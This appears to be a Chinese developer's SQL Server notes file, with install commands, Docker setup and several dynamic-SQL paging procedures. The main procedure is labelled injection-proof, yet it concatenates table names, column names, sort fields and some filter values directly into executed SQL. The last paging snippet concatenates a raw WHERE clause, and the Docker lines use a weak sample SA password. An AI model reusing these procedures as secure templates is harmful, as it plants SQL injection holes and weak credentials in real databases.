- 链接服务器229Err
- GRANT EXECUTE ON SYS.XP_PROP_OLEDB_PROVIDER TO username;
- [mysql与sqlserver互转](http://blog.csdn.net/zzq900503/article/details/17505295)
- [mysql与sqlserver互转](https://www.bbsmax.com/A/GBJrnDxBJ0/)

# Win10安装
```sh
Dism /online /enable-feature /featurename:NetFX3 /All /Source:D:\sources\sxs /LimitAccess
```

# CentOS7-SQLServer，你不会真的在Unix上还要装SQLServer吧，看看就行
```java
yum -y install wget
wget https://packages.microsoft.com/config/rhel/7/mssql-server.repo
wget https://packages.microsoft.com/config/rhel/7/prod.repo
mv mssql-server.repo /etc/yum.repos.d/mssql.repo
mv prod.repo /etc/yum.repos.d/prod.repo
yum install -y mssql-server
/opt/mssql/bin/mssql-conf setup
/opt/mssql/bin/sqlservr -setup 
systemctl start mssql-server
systemctl enable mssql-server
yum install -y mssql-tools
firewall-cmd --permanent --zone=public --add-port=1433/tcp
echo 'export PATH="$PATH:/opt/mssql-tools/bin"' >> ~/.bashrc
source ~/.bashrc
sqlcmd -H 127.0.0.1 -U sa
```
# docker
```sh
docker pull microsoft/mssql-server-linux
docker create -v /var/opt/mssql --name mssql microsoft/mssql-server-linux /bin/true
docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=12345678@Abc'  -p 1433:1433 --volumes-from mssql -d microsoft/mssql-server-linux
docker run -p 1433:1433 -v ~/DB/mssql:/var/opt/mssql/data -d microsoft/mssql-server-linux
docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=12345678@Abc'  -p 1433:1433  -d microsoft/mssql-server-linux
docker inspect --format "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}" id
```
# 通用动态拼接防注入分页查询
```sql

ALTER PROCEDURE [dbo].[zt_usp_TablePageEx]
    @plan INT = 1 ,--方案
    @tablename VARCHAR(50) ,--表名
    @keyname VARCHAR(50) ,--聚合索引列名，或从表外键
    @keyvalue VARCHAR(50) = '' ,--此参数有值不匹配where
    @selectcolumn VARCHAR(255) = '' ,--返回字段
    @sortcolumn VARCHAR(255) = '' ,--排序字段
    @pagecount INT = 1 ,--每页记录数
    @pageindex INT = 1 ,--页号
    @indexparam1 VARCHAR(20) = '' ,
    @indexop1 VARCHAR(10) = '' ,
    @indexvalue1 VARCHAR(1000) = '' ,
    @indexparam2 VARCHAR(20) = '' ,
    @indexop2 VARCHAR(10) = '' ,
    @indexvalue2 VARCHAR(1000) = '' ,
    @indexparam3 VARCHAR(20) = '' ,
    @indexop3 VARCHAR(10) = '' ,
    @indexvalue3 VARCHAR(1000) = '' ,
    @datename1 VARCHAR(20) = '' ,
    @fdate1 VARCHAR(10) = '' ,
    @ddate1 VARCHAR(10) = '' ,
    @datename2 VARCHAR(20) = '' ,
    @fdate2 VARCHAR(10) = '' ,
    @ddate2 VARCHAR(10) = '' ,
    @indexparam4 VARCHAR(20) = '' ,
    @indexop4 VARCHAR(10) = '' ,
    @indexvalue4 VARCHAR(1000) = '' ,
    @indexparam5 VARCHAR(20) = '' ,
    @indexop5 VARCHAR(10) = '' ,
    @indexvalue5 VARCHAR(1000) = '' ,
    @indexparam6 VARCHAR(20) = '' ,
    @indexop6 VARCHAR(10) = '' ,
    @indexvalue6 VARCHAR(1000) = '' ,
    @indexparam7 VARCHAR(20) = '' ,
    @indexop7 VARCHAR(10) = '' ,
    @indexvalue7 VARCHAR(1000) = '' ,
    @indexparam8 VARCHAR(20) = '' ,
    @indexop8 VARCHAR(10) = '' ,
    @indexvalue8 VARCHAR(1000) = '' ,
    @indexparam9 VARCHAR(20) = '' ,
    @indexop9 VARCHAR(10) = '' ,
    @indexvalue9 VARCHAR(1000) = '' ,
    @noindexparam1 VARCHAR(20) = '' ,
    @noindexop1 VARCHAR(10) = '' ,
    @noindexvalue1 VARCHAR(1000) = '' ,
    @noindexparam2 VARCHAR(20) = '' ,
    @noindexop2 VARCHAR(10) = '' ,
    @noindexvalue2 VARCHAR(1000) = '' ,
    @noindexparam3 VARCHAR(20) = '' ,
    @noindexop3 VARCHAR(10) = '' ,
    @noindexvalue3 VARCHAR(1000) = ''
AS
    BEGIN
	/***************************************************
	作者：张涛  QQ:28400798
	功能：通用预编译防注入分页查询，只有=与LIKE
	预留3个非索引查询位，尽量不要用
	@sortcolumn留空为@keyname
	方案一：直接查询，所有条件包括返回列全走索引最快，@selectcolumn留空返回@keyname
	方案二：直接查询，@selectcolumn留空返回所有列
	方案三：返回所有列，@selectcolumn无效，配合@keyvalue可当作GetBussinessByKey
	方案四：若指定@selectcolumn则每个列名需添加固定前缀a.，留空返回@keyname
	方案五：不指定@keyvalue返回两个表，第一个是总条数，指定@keyvalue同方案三一样
	zt_usp_TablePageEx 3,'tb_TMS_YD','YDNO','SHSSS1','','',2000,1,'YDNO','LIKE','sh'

	zt_usp_TablePageEx 5,'tb_TMS_YD','YDNO','','','',2000,1

	如果能全走索引就用方案一，否则用方案三
	需要分页总条数用方案五，@keyvalue留空
	主从表查询主表方案三,查从表只能用方案二
	***************************************************/
        SET NOCOUNT ON;	
        DECLARE @beginrow INT;
        DECLARE @endrow INT;
        SET @beginrow = 0;
        SET @endrow = 0;
        SET @beginrow = ( @pageindex - 1 ) * @pagecount + 1;
        SET @endrow = @pageindex * @pagecount;
        DECLARE @sqlstr NVARCHAR(4000)= '';
        DECLARE @getcolname NVARCHAR(1000) ,
            @selcolumn VARCHAR(MAX) ,
            @wheresql NVARCHAR(MAX)= '';
        IF @sortcolumn = ''
            SELECT  @sortcolumn = @keyname;
		----------------------------------------------------
		--拼接where条件，用的是预编译形式传参，必须一个一个写
        IF ISNULL(@keyvalue, '') <> ''
            BEGIN
                SET @wheresql = @wheresql + ' AND ' + @keyname
                    + ' =  @keyvalue ';
            END; 
        ELSE
            BEGIN
                IF ISNULL(@indexparam1, '') <> ''
                    AND ( ISNULL(@indexop1, '') = '='
                          OR ISNULL(@indexop1, '') = 'LIKE'
                        )
                    AND ISNULL(@indexvalue1, '') <> ''
                    BEGIN
                        IF @indexop1 = '='
                            SET @indexop1 = @indexop1;
                        ELSE
                            IF @indexop1 = 'LIKE'
                                SET @indexvalue1 = '' + @indexvalue1 + '%';
                        SET @wheresql = @wheresql + ' AND ' + @indexparam1
                            + ' ' + @indexop1 + ' @indexvalue1 ';
                    END;
                IF ISNULL(@indexparam2, '') <> ''
                    AND ( ISNULL(@indexop2, '') = '='
                          OR ISNULL(@indexop2, '') = 'LIKE'
                        )
                    AND ISNULL(@indexvalue2, '') <> ''
                    BEGIN
                        IF @indexop2 = '='
                            SET @indexop2 = @indexop2;
                        ELSE
                            IF @indexop2 = 'LIKE'
                                SET @indexvalue2 = '' + @indexvalue2 + '%';
                        SET @wheresql = @wheresql + ' AND ' + @indexparam2
                            + ' ' + @indexop2 + ' @indexvalue2 ';
                    END;
                IF ISNULL(@indexparam3, '') <> ''
                    AND ( ISNULL(@indexop3, '') = '='
                          OR ISNULL(@indexop3, '') = 'LIKE'
                        )
                    AND ISNULL(@indexvalue3, '') <> ''
                    BEGIN
                        IF @indexop3 = '='
                            SET @indexop3 = @indexop3;
                        ELSE
                            IF @indexop3 = 'LIKE'
                                SET @indexvalue3 = '' + @indexvalue3 + '%';
                        SET @wheresql = @wheresql + ' AND ' + @indexparam3
                            + ' ' + @indexop3 + ' @indexvalue3 ';
                    END;
                IF ISNULL(@datename1, '') <> ''
                    BEGIN
                        IF ISNULL(@ddate1, '') = ''
                            SELECT  @ddate1 = CONVERT(VARCHAR(10), DATEADD(DAY,
                                                              1, GETDATE()), 120);
                        IF ISNULL(@fdate1, '') = ''
                            SELECT  @fdate1 = CONVERT(VARCHAR(10), DATEADD(DAY,
                                                              -180, @ddate1), 120);
                        SET @wheresql = @wheresql + ' AND ' + @datename1
                            + '   BETWEEN @fdate1 AND @ddate1  ';
                    END;
                IF ISNULL(@datename2, '') <> ''
                    BEGIN
                        IF ISNULL(@ddate2, '') = ''
                            SELECT  @ddate2 = CONVERT(VARCHAR(10), DATEADD(DAY,
                                                              1, GETDATE()), 120);
                        IF ISNULL(@fdate2, '') = ''
                            SELECT  @fdate2 = CONVERT(VARCHAR(10), DATEADD(DAY,
                                                              -180, @ddate2), 120);
                        SET @wheresql = @wheresql + ' AND ' + @datename2
                            + '   BETWEEN @fdate2 AND @ddate2 ';
                    END;
                
                IF ISNULL(@indexparam4, '') <> ''
                    AND ( ISNULL(@indexop4, '') = '='
                          OR ISNULL(@indexop4, '') = 'LIKE'
                        )
                    AND ISNULL(@indexvalue4, '') <> ''
                    BEGIN
                        IF @indexop4 = '='
                            SET @indexop4 = @indexop4;
                        ELSE
                            IF @indexop4 = 'LIKE'
                                SET @indexvalue4 = '' + @indexvalue4 + '%';
                        SET @wheresql = @wheresql + ' AND ' + @indexparam4
                            + ' ' + @indexop4 + ' @indexvalue4 ';
                    END;
                IF ISNULL(@indexparam5, '') <> ''
                    AND ( ISNULL(@indexop5, '') = '='
                          OR ISNULL(@indexop5, '') = 'LIKE'
                        )
                    AND ISNULL(@indexvalue5, '') <> ''
                    BEGIN
                        IF @indexop5 = '='
                            SET @indexop5 = @indexop5;
                        ELSE
                            IF @indexop5 = 'LIKE'
                                SET @indexvalue5 = '' + @indexvalue5 + '%';
                        SET @wheresql = @wheresql + ' AND ' + @indexparam5
                            + ' ' + @indexop5 + ' @indexvalue5 ';
                    END;
                IF ISNULL(@indexparam6, '') <> ''
                    AND ( ISNULL(@indexop6, '') = '='
                          OR ISNULL(@indexop6, '') = 'LIKE'
                        )
                    AND ISNULL(@indexvalue6, '') <> ''
                    BEGIN
                        IF @indexop6 = '='
                            SET @indexop6 = @indexop6;
                        ELSE
                            IF @indexop6 = 'LIKE'
                                SET @indexvalue6 = '' + @indexvalue6 + '%';
                        SET @wheresql = @wheresql + ' AND ' + @indexparam6
                            + ' ' + @indexop6 + ' @indexvalue6 ';
                    END;
                IF ISNULL(@indexparam7, '') <> ''
                    AND ( ISNULL(@indexop7, '') = '='
                          OR ISNULL(@indexop7, '') = 'LIKE'
                        )
                    AND ISNULL(@indexvalue7, '') <> ''
                    BEGIN
                        IF @indexop7 = '='
                            SET @indexop7 = @indexop7;
                        ELSE
                            IF @indexop7 = 'LIKE'
                                SET @indexvalue7 = '' + @indexvalue7 + '%';
                        SET @wheresql = @wheresql + ' AND ' + @indexparam7
                            + ' ' + @indexop7 + ' @indexvalue7 ';
                    END;
                IF ISNULL(@indexparam8, '') <> ''
                    AND ( ISNULL(@indexop8, '') = '='
                          OR ISNULL(@indexop8, '') = 'LIKE'
                        )
                    AND ISNULL(@indexvalue8, '') <> ''
                    BEGIN
                        IF @indexop8 = '='
                            SET @indexop8 = @indexop8;
                        ELSE
                            IF @indexop8 = 'LIKE'
                                SET @indexvalue8 = '' + @indexvalue8 + '%';
                        SET @wheresql = @wheresql + ' AND ' + @indexparam8
                            + ' ' + @indexop8 + ' @indexvalue8 ';
                    END;
                IF ISNULL(@indexparam9, '') <> ''
                    AND ( ISNULL(@indexop9, '') = '='
                          OR ISNULL(@indexop9, '') = 'LIKE'
                        )
                    AND ISNULL(@indexvalue9, '') <> ''
                    BEGIN
                        IF @indexop9 = '='
                            SET @indexop9 = @indexop9;
                        ELSE
                            IF @indexop9 = 'LIKE'
                                SET @indexvalue9 = '' + @indexvalue9 + '%';
                        SET @wheresql = @wheresql + ' AND ' + @indexparam9
                            + ' ' + @indexop9 + ' @indexvalue9 ';
                    END;
                IF ISNULL(@noindexparam1, '') <> ''
                    AND ( ISNULL(@noindexop1, '') = '='
                          OR ISNULL(@noindexop1, '') = 'LIKE'
                        )
                    AND ISNULL(@noindexvalue1, '') <> ''
                    BEGIN
                        IF @noindexop1 = '='
                            SET @wheresql = @wheresql + ' AND '
                                + @noindexparam1 + ' ' + @noindexop1 + ' '
                                + @noindexvalue1;
                        ELSE
                            IF @noindexop1 = 'LIKE'
                                SET @wheresql = @wheresql
                                    + ' AND CHARINDEX(@noindexvalue1,'
                                    + @noindexparam1 + ')>0';
                    END;
                IF ISNULL(@noindexparam2, '') <> ''
                    AND ( ISNULL(@noindexop2, '') = '='
                          OR ISNULL(@noindexop2, '') = 'LIKE'
                        )
                    AND ISNULL(@noindexvalue2, '') <> ''
                    BEGIN
                        IF @noindexop2 = '='
                            SET @wheresql = @wheresql + ' AND '
                                + @noindexparam2 + ' ' + @noindexop2 + ' '
                                + @noindexvalue2;
                        ELSE
                            IF @noindexop2 = 'LIKE'
                                SET @wheresql = @wheresql
                                    + ' AND CHARINDEX(@noindexvalue2,'
                                    + @noindexparam2 + ')>0';
                    END;
                IF ISNULL(@noindexparam3, '') <> ''
                    AND ( ISNULL(@noindexop3, '') = '='
                          OR ISNULL(@noindexop3, '') = 'LIKE'
                        )
                    AND ISNULL(@noindexvalue3, '') <> ''
                    BEGIN
                        IF @noindexop3 = '='
                            SET @wheresql = @wheresql + ' AND '
                                + @noindexparam3 + ' ' + @noindexop3 + ' '
                                + @noindexvalue3;
                        ELSE
                            IF @noindexop3 = 'LIKE'
                                SET @wheresql = @wheresql
                                    + ' AND CHARINDEX(@noindexvalue3,'
                                    + @noindexparam3 + ')>0';
                    END;
            END;
		----------------------------------------------------
		--方案一，查询一次，返回列全在索引中效率最高
        IF @plan = 1
            BEGIN
                IF @selectcolumn = ''
                    SELECT  @selectcolumn = @keyname;
                SELECT  @selcolumn = @selectcolumn;
                SET @sqlstr = 'with T as(select ' + @selcolumn
                    + ',ROW_NUMBER() OVER(ORDER BY ' + @sortcolumn
                    + ' ) AS ROWNUM' + ' FROM ' + @tablename + ' WHERE 1=1 ';
                
                SET @sqlstr = @sqlstr + @wheresql + ') ';
                SET @sqlstr = @sqlstr + ' SELECT ' + @selcolumn + ' FROM T ';         
            END;
		----------------------------------------------------
		--方案二，查询一次，返回所有列
        IF @plan = 2
            BEGIN
                IF @selectcolumn = ''
                    BEGIN
                        SELECT  @getcolname = ' SELECT @selcolumn=dbo.ufn_GetAllColumns(@tablename,'''','''') ';
                        EXEC sp_executesql @getcolname,
                            N'@tablename NVARCHAR(4000),@selcolumn varchar(max) out',
                            @tablename = @tablename,
                            @selcolumn = @selcolumn OUT;
                    END;
                SET @sqlstr = 'with T as(select ' + @selcolumn
                    + ',ROW_NUMBER() OVER(ORDER BY ' + @sortcolumn
                    + ' ) AS ROWNUM' + ' FROM ' + @tablename + ' WHERE 1=1 ';
                
                SET @sqlstr = @sqlstr + @wheresql + ') ';
                SET @sqlstr = @sqlstr + ' SELECT ' + @selcolumn + ' FROM T ';         
            END;
		----------------------------------------------------
		--方案三，先查唯一列再联表，返回所有列，必须启用别名。
        IF @plan = 3
            BEGIN
                SELECT  @getcolname = ' SELECT @selcolumn=dbo.ufn_GetAllColumns(@tablename,''a'','''') ';
                EXEC sp_executesql @getcolname,
                    N'@tablename NVARCHAR(4000),@selcolumn varchar(max) out',
                    @tablename = @tablename, @selcolumn = @selcolumn OUT;
           
                SET @sqlstr = 'with T as(select ' + @keyname
                    + ',ROW_NUMBER() OVER(ORDER BY ' + @sortcolumn
                    + ' ) AS ROWNUM' + ' FROM ' + @tablename + ' WHERE 1=1 ';
                
                SET @sqlstr = @sqlstr + @wheresql + ') ';
                SET @sqlstr = @sqlstr + ' SELECT ' + @selcolumn + ' FROM T 
			LEFT JOIN ' + @tablename + ' a ON T.' + @keyname + ' = a.'
                    + @keyname;
            END;
		----------------------------------------------------
		--方案四，先查唯一列再联表，返回指定列，指定列必须添加别名前缀。
        IF @plan = 4
            BEGIN
                IF @selectcolumn = ''
                    SELECT  @selectcolumn = @keyname;
                SELECT  @selcolumn = @selectcolumn;
                SET @sqlstr = 'with T as(select ' + @selcolumn
                    + ',ROW_NUMBER() OVER(ORDER BY ' + @sortcolumn
                    + ' ) AS ROWNUM' + ' FROM ' + @tablename + ' a WHERE 1=1 ';
                
                SET @sqlstr = @sqlstr + @wheresql + ') ';
                IF SUBSTRING(@selcolumn, 1, 2) <> 'a.'
                    SELECT  @selcolumn = 'a.' + @selcolumn;
                SET @sqlstr = @sqlstr + ' SELECT ' + @selcolumn + ' FROM T 
			LEFT JOIN ' + @tablename + ' a ON T.' + @keyname + ' = a.'
                    + @keyname;
            END;
		----------------------------------------------------
		--方案五
        IF @plan = 5
            BEGIN
                SELECT  @getcolname = ' SELECT @selcolumn=dbo.ufn_GetAllColumns(@tablename,''a'','''') ';
                EXEC sp_executesql @getcolname,
                    N'@tablename NVARCHAR(4000),@selcolumn varchar(max) out',
                    @tablename = @tablename, @selcolumn = @selcolumn OUT;
				--同方案三，返回数据带总条数，先查唯一列再联表，返回所有列，必须启用别名。
                IF ISNULL(@keyvalue, '') = ''
                    BEGIN
                        CREATE TABLE #TMP
                            (
                              keyId VARCHAR(50) ,
                              ROWNUM INT
                            );
                        
                        SET @sqlstr = ' INSERT INTO	#TMP ( keyId, ROWNUM ) select '
                            + @keyname + ',ROW_NUMBER() OVER(ORDER BY '
                            + @sortcolumn + ' ) AS ROWNUM' + ' FROM '
                            + @tablename + ' WHERE 1=1 ';

                        SET @sqlstr = @sqlstr + @wheresql + ' ';

                        DECLARE @sqlcount NVARCHAR(MAX)= '';

                        SET @sqlcount = @sqlstr
                            + ' SELECT COUNT(*) FROM #TMP;';

                        SET @sqlstr = ' SELECT ' + @selcolumn + ' FROM #TMP 
			LEFT JOIN ' + @tablename + ' a ON #TMP.keyId = a.' + @keyname;

                        SET @sqlstr = @sqlstr
                            + ' WHERE #TMP.ROWNUM BETWEEN @beginrow AND @endrow ';
                       
                        PRINT @sqlcount;
                        PRINT @sqlstr;
                        EXEC sp_executesql @sqlcount,
                            N'@indexvalue1 VARCHAR(1000),@indexvalue2 VARCHAR(1000),@indexvalue3 VARCHAR(1000),@indexvalue4 VARCHAR(1000),@indexvalue5 VARCHAR(1000),@indexvalue6 VARCHAR(1000),@indexvalue7 VARCHAR(1000),@indexvalue8 VARCHAR(1000),@indexvalue9 VARCHAR(1000),@fdate1 VARCHAR(10),@ddate1 VARCHAR(10),@fdate2 VARCHAR(10),@ddate2 VARCHAR(10),@keyvalue VARCHAR(50),@noindexvalue1 VARCHAR(1000),@noindexvalue2 VARCHAR(1000),@noindexvalue3 VARCHAR(1000)',
                            @indexvalue1, @indexvalue2, @indexvalue3,
                            @indexvalue4, @indexvalue5, @indexvalue6,
                            @indexvalue7, @indexvalue8, @indexvalue9, @fdate1,
                            @ddate1, @fdate2, @ddate2, @keyvalue,
                            @noindexvalue1, @noindexvalue2, @noindexvalue3;
         --zt_usp_TablePageEx 5,'tb_TMS_YD','YDNO','','','',2000,1
                   
                        EXEC sp_executesql @sqlstr,
                            N'@beginrow INT,@endrow INT',
                            @beginrow = @beginrow, @endrow = @endrow;
                        DROP TABLE #TMP;
                        RETURN;
                    END;
                ELSE
				--同方案三一样
                    IF ISNULL(@keyvalue, '') <> ''
                        BEGIN
                            SET @sqlstr = 'with T as(select ' + @keyname
                                + ',ROW_NUMBER() OVER(ORDER BY ' + @sortcolumn
                                + ' ) AS ROWNUM' + ' FROM ' + @tablename
                                + ' WHERE 1=1 ';
                
                            SET @sqlstr = @sqlstr + @wheresql + ') ';
                            SET @sqlstr = @sqlstr + ' SELECT ' + @selcolumn
                                + ' FROM T 
			LEFT JOIN ' + @tablename + ' a ON T.' + @keyname + ' = a.'
                                + @keyname;
                        END;
            END;
		----------------------------------------------------
		
        IF ISNULL(@keyvalue, '') = ''
            SET @sqlstr = @sqlstr
                + ' WHERE T.ROWNUM BETWEEN @beginrow AND @endrow ';

        PRINT @sqlstr;
        EXEC sp_executesql @sqlstr,
            N'@indexvalue1 VARCHAR(1000),@indexvalue2 VARCHAR(1000),@indexvalue3 VARCHAR(1000),@indexvalue4 VARCHAR(1000),@indexvalue5 VARCHAR(1000),@indexvalue6 VARCHAR(1000),@indexvalue7 VARCHAR(1000),@indexvalue8 VARCHAR(1000),@indexvalue9 VARCHAR(1000),@fdate1 VARCHAR(10),@ddate1 VARCHAR(10),@fdate2 VARCHAR(10),@ddate2 VARCHAR(10),@keyvalue VARCHAR(50),@beginrow INT,@endrow INT,@noindexvalue1 VARCHAR(1000),@noindexvalue2 VARCHAR(1000),@noindexvalue3 VARCHAR(1000)',
            @indexvalue1, @indexvalue2, @indexvalue3, @indexvalue4,
            @indexvalue5, @indexvalue6, @indexvalue7, @indexvalue8,
            @indexvalue9, @fdate1, @ddate1, @fdate2, @ddate2, @keyvalue,
            @beginrow, @endrow, @noindexvalue1, @noindexvalue2, @noindexvalue3;
           
        SET NOCOUNT OFF;
    END;

```
# 获取所有列名
```sql

CREATE FUNCTION ufn_GetAllColumns
    (
      @tablename VARCHAR(50) ,
      @tablealias VARCHAR(10) = '' ,
      @columalias VARCHAR(10) = ''
	)
RETURNS VARCHAR(MAX)
AS
    BEGIN
        DECLARE @columnlist1 VARCHAR(MAX)= ' ' ,
            @lastchar CHAR(1);
        IF @tablealias <> ''
            BEGIN
                SELECT  @lastchar = RIGHT(@tablealias, 1);
                IF @lastchar <> '.'
                    SET @tablealias = @tablealias + '.';
            END;
        IF @columalias <> ''
            BEGIN
                SELECT  @lastchar = RIGHT(@columalias, 1);
                IF @lastchar <> '_'
                    SET @columalias = @columalias + '_';
                SELECT  @columnlist1 = @columnlist1 + @tablealias +'['+NAME+']'
                        + ' as ' + @columalias + name + ' ,'
                FROM    syscolumns
                WHERE   id = OBJECT_ID(@tablename);
                SELECT  @columnlist1 = LEFT(@columnlist1,
                                            LEN(@columnlist1) - 1);
            END;
        ELSE
            IF @columalias = ''
                BEGIN
                    SELECT  @columnlist1 = @columnlist1 + @tablealias + '['+NAME+']'
                            + ' ,'
                    FROM    syscolumns
                    WHERE   id = OBJECT_ID(@tablename);
                    SELECT  @columnlist1 = LEFT(@columnlist1,
                                                LEN(@columnlist1) - 1);
                END;
        RETURN  ISNULL(@columnlist1,'');
    END;

GO


```
# 查看包含字符串的存储过程
```sql
select   b.name   ,a.text   from   syscomments   a,sysobjects   b 
where 
charindex('字符串内容',a.text)>0    and 
object_id(b.name)=a.id   and   b.xtype   in('P','TR')
```
# 动态拼接防注入分页查询
```sql
    DECLARE @SQL NVARCHAR(MAX)--sp_executesql需要用NVARCHAR类型
    CREATE TABLE #tmp(isid int)
	SET @SQL=' INSERT INTO #tmp SELECT isid FROM ( 
    SELECT isid	,ROW_NUMBER() OVER(ORDER BY isid,@param1 DESC ) AS Rowid
	FROM dbo.dt_table a WHERE 1=1 '
	IF ISNULL(@param1,'')<>'' 
		BEGIN
		SET @SQL=@SQL+' AND a.param1 = @param1 '
		END	
	IF(ISNULL(@param2,'')<>'') 
		BEGIN
		SET @param2 = '' + @param2 + ''
		SET @SQL=@SQL+' AND a.param2 IN (SELECT COL FROM dbo.ufn_SplitEx(@param2,'','',1))'
		END
	IF ISNULL(@param3,'N')='Y' 
		SET @SQL=@SQL+' AND a.param3 = @param3 '
	IF ISNULL(@param4,'')<>'' 
		BEGIN
		SET @param4 = '%' + @param4 + '%'
		SET @SQL=@SQL+' AND (a.param4 LIKE @param4 OR a.param5 LIKE @param4) '
		END
	SET @SQL=@SQL+' ) as b where b.Rowid BETWEEN @beginrow AND @endrow '

	EXEC sp_executesql @SQL,N'@param1 varchar(60),@param2 varchar(10),@param3 VARCHAR(32),@param4 NVARCHAR(20),@beginrow INT,@endrow INT', @param1=@param1,@param2=@param2,@param3=@param3,@param4=@param4,@beginrow=@beginrow,@endrow=@endrow
	
	SELECT * FROM dt_tabel WHERE isid IN (SELECT isid FROM #tmp)

```
# 执行顺序
```sql
(8)SELECT 
(9)DISTINCT
(11)<TOP_specification> <select_list>
(1)FROM <left_table>
(3)　<join_type> JOIN <right_table>
(2)　 ON <join_condition>
(4)WHERE <where_condition>
(5)GROUP BY <group_by_list>
(6)WITH {CUBE | ROLLUP}
(7)HAVING <having_condition>
(10)ORDER BY <order_by_list>
```
# 常用方法
```sql
SELECT REPLACE(REPLACE(REPLACE(CONVERT(VARCHAR(10), GETDATE(), 120 ),'-',''),' ',''),':','')

SELECT  CONVERT(VARCHAR(10), DATEADD(DD,-DAY(DATEADD(MONTH,-1,GETDATE()))+1,DATEADD(MONTH,-1,GETDATE())),120)    /*上个月一号*/

SELECT   DATEADD(DAY,-DAY(GETDATE()),GETDATE())                                                                      /* 上月月底 */

SELECT   DATEADD(DD,-DAY(GETDATE())+1,GETDATE())                                                                  /* 本月一号 */

SELECT   DATEADD(DD,-DAY(DATEADD(MONTH,1,GETDATE())),DATEADD(MONTH,1,GETDATE()))            /* 本月底 */

SELECT   DATEADD(DD,-DAY(DATEADD(MONTH,1,GETDATE()))+1,DATEADD(MONTH,1,GETDATE()))        /* 下月一号 */

SELECT   DATEADD(DD,-DAY(DATEADD(MONTH,2,GETDATE())),DATEADD(MONTH,2,GETDATE()))            /* 下月月底 */

```
# 序号
```sql
UPDATE x
SET x.Queue = x.QueueNo,x.QKNO=@QKNO
FROM (
      SELECT QKNO,Queue, ROW_NUMBER() OVER (ORDER BY isid) AS QueueNo
      FROM #tb_table WHERE param2=@param2 AND param1=@param1
      ) x
```
# 多行转一行
```sql
SELECT TOP 100 A.YDNO,A.DocDate, ZZANDDT=
STUFF(
(SELECT ','+B.DocNo FROM dbo.tb_tableB AS B
WHERE B.YDNO=A.YDNO FOR XML PATH (''))
,1,1,'')
FROM dbo.tb_table A WHERE 1=1
ORDER BY A.CreationDate DESC
```
# 游标
```sql
BEGIN TRAN
    DECLARE @isid INT
    DECLARE CusCursor CURSOR FOR
    SELECT isid FROM dbo.dt_CarInfo

    OPEN CusCursor 
    FETCH NEXT FROM CusCursor INTO @isid
    WHILE (@@FETCH_STATUS = 0)
         BEGIN

		 SELECT * FROM dbo.dt_CarInfo WHERE isid=@isid

		 IF(@@ERROR != 0)
         BEGIN
           ROLLBACK TRAN
           RETURN
         END
         
         FETCH NEXT FROM CusCursor INTO @isid
         END
     CLOSE CusCursor 
     DEALLOCATE CusCursor 
COMMIT TRAN
```
# 事务
```sql
ALTER PROC usp_AccountTransaction  
  
    @AccountNum INT,  
  
    @Amount DECIMAL  
  
AS  
  
BEGIN  
  
    BEGIN TRY --Start the Try Block..  
  
        BEGIN TRANSACTION -- Start the transaction..  
  
            UPDATE MyChecking SET Amount = Amount - @Amount  
  
                WHERE AccountNum = @AccountNum  
  
            UPDATE MySavings SET Amount = Amount + @Amount  
  
                WHERE AccountNum = @AccountNum  
  
        COMMIT TRAN -- Transaction Success!  
  
    END TRY  
  
    BEGIN CATCH  
  
        IF @@TRANCOUNT > 0  
  
            ROLLBACK TRAN --RollBack in case of Error  
  
        -- you can Raise ERROR with RAISEERROR() Statement including the details of the exception  
  
        RAISERROR(ERROR_MESSAGE(), ERROR_SEVERITY(), 1)  
  
    END CATCH  

    --CATCH 方法2
    BEGIN CATCH
        IF ( XACT_STATE() ) = -1
            BEGIN
                RAISERROR ('操作发生错误！', 16, 1) WITH NOWAIT; 
                ROLLBACK TRANSACTION;
            END;
    
        IF ( XACT_STATE() ) = 1
            BEGIN
                COMMIT TRANSACTION;   
            END;
    END CATCH;
END  
ERROR_NUMBER()	返回导致运行 CATCH 块的错误消息的错误号。
ERROR_SEVERITY()	返回导致 CATCH 块运行的错误消息的严重级别
ERROR_STATE()	返回导致 CATCH 块运行的错误消息的状态号
ERROR_PROCEDURE()	返回出现错误的存储过程名称
ERROR_LINE()	返回发生错误的行号
ERROR_MESSAGE()	返回导致 CATCH 块运行的错误消息的完整文本

```
# 分割字符串
```sql
CREATE FUNCTION ufn_SplitStr
    (
      @str VARCHAR(MAX) ,  --要分割的字符串
      @split VARCHAR(10) ,  --分隔符号
      @index INT --取第几个元素
    )
RETURNS VARCHAR(1024)
AS
    BEGIN
        DECLARE @location INT;
        DECLARE @start INT;
        DECLARE @next INT;
        DECLARE @seed INT;

        SET @str = LTRIM(RTRIM(@str));
        SET @start = 1;
        SET @next = 1;
        SET @seed = LEN(@split);
  
        SET @location = CHARINDEX(@split, @str);
        WHILE @location <> 0
            AND @index > @next
            BEGIN
                SET @start = @location + @seed;
                SET @location = CHARINDEX(@split, @str, @start);
                SET @next = @next + 1;
            END;
        IF @location = 0
            SELECT  @location = LEN(@str) + 1;
 --这儿存在两种情况：1、字符串不存在分隔符号 2、字符串中存在分隔符号，跳出while循环后，@location为0，那默认为字符串后边有一个分隔符号。
  
        RETURN SUBSTRING(@str,@start,@location-@start);
    END;
```
# 分页
```sql
(
    @tablename NVARCHAR(4000),--表名
	@selcolumn NVARCHAR(1000),--查询字段
	@where NVARCHAR(1000),--where条件
	@sortcolumn  NVARCHAR(255),--排序字段
	@pagecount  INT,--每页记录数
	@pageindex  INT--页号
)

    DECLARE @beginrow INT
	DECLARE @endrow INT

	SET @beginrow=0
	SET @endrow=0
    SET @beginrow=(@pageindex-1)*@pagecount+1
	SET @endrow=@pageindex*@pagecount

	DECLARE @sqlstr NVARCHAR(4000)=''
	--SET @sqlstr='with table1 as(select '+ @selcolumn +',ROW_NUMBER() OVER(ORDER BY '+ @sortcolumn+' ) AS ROW'+
	--			' FROM '+@tablename+' WHERE '+@where+') '
	--set @sqlstr=@sqlstr +' SELECT '+ @selcolumn +' FROM TABLE1 WHERE ROW BETWEEN '+cast(@beginrow as nvarchar )+' and '+cast(@endrow as nvarchar)
	--SET @sqlstr=@sqlstr +' SELECT * FROM TABLE1 WHERE ROW BETWEEN '+CAST(@beginrow AS NVARCHAR )+' and '+CAST(@endrow AS NVARCHAR)

	SET @sqlstr=@sqlstr +' SELECT * FROM (select '+ @selcolumn +',ROW_NUMBER() OVER(ORDER BY '+ @sortcolumn+' ) AS ROW'+
				' FROM '+@tablename+' WHERE '+@where+') AS a WHERE ROW BETWEEN '+CAST(@beginrow AS NVARCHAR )+' and '+CAST(@endrow AS NVARCHAR)

